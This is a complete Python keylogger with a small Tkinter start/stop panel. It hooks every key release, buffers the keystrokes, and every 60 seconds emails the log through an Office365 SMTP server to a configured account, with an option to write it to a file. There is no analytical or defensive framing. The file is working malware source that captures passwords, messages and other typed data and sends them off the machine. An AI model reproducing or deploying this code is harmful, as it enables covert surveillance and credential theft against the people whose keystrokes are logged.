import keyboard
import smtplib
from threading import Timer
from datetime import datetime
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import tkinter as tk
from tkinter import messagebox

SEND_REPORT_EVERY = 60
EMAIL_ADDRESS = ""
EMAIL_PASSWORD = ""

class Keylogger:
    def __init__(self, interval, report_method="email"):
        self.interval = interval
        self.report_method = report_method
        self.log = ""
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()

    def callback(self, event):
        name = event.name
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        self.log += name

    def update_filename(self):
        start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
        end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
        self.filename = f"keylog-{start_dt_str}_{end_dt_str}"

    def report_to_file(self):
        with open(f"{self.filename}.txt", "w") as f:
            print(self.log, file=f)
        print(f"[+] Saved {self.filename}.txt")

    def prepare_mail(self, message):
        msg = MIMEMultipart("alternative")
        msg["From"] = EMAIL_ADDRESS
        msg["To"] = EMAIL_ADDRESS
        msg["Subject"] = "Keylogger logs"
        html = f"<p>{message}</p>"
        text_part = MIMEText(message, "plain")
        html_part = MIMEText(html, "html")
        msg.attach(text_part)
        msg.attach(html_part)
        return msg.as_string()

    def sendmail(self, email, password, message, verbose=1):
        try:
            server = smtplib.SMTP(host="smtp.office365.com", port=587)
            server.starttls()
            server.login(email, password)
            server.sendmail(email, email, self.prepare_mail(message))
            server.quit()
            if verbose:
                print(f"{datetime.now()} - Sent an email to {email} containing: {message}")
        except Exception as e:
            print(f"Failed to send email: {e}")

    def report(self):
        if self.log:
            self.end_dt = datetime.now()
            self.update_filename()
            if self.report_method == "email":
                self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
            elif self.report_method == "file":
                self.report_to_file()
            self.start_dt = datetime.now()
        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        timer.daemon = True
        timer.start()

class KeyloggerGUI:
    def __init__(self, master):
        self.master = master
        master.title("Keylogger Control")
        self.keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="email")

        self.label = tk.Label(master, text="Keylogger Control Panel")
        self.label.pack(pady=10)

        self.start_button = tk.Button(master, text="Start Keylogger", command=self.start_keylogger)
        self.start_button.pack(pady=5)

        self.stop_button = tk.Button(master, text="Stop Keylogger", command=self.stop_keylogger)
        self.stop_button.pack(pady=5)

    def start_keylogger(self):
        self.keylogger.start_dt = datetime.now()
        keyboard.on_release(self.keylogger.callback)
        self.keylogger.report()
        messagebox.showinfo("Info", "Keylogger started.")

    def stop_keylogger(self):
        keyboard.unhook_all()
        messagebox.showinfo("Info", "Keylogger stopped.")

if __name__ == "__main__":
    root = tk.Tk()
    gui = KeyloggerGUI(root)
    root.mainloop()
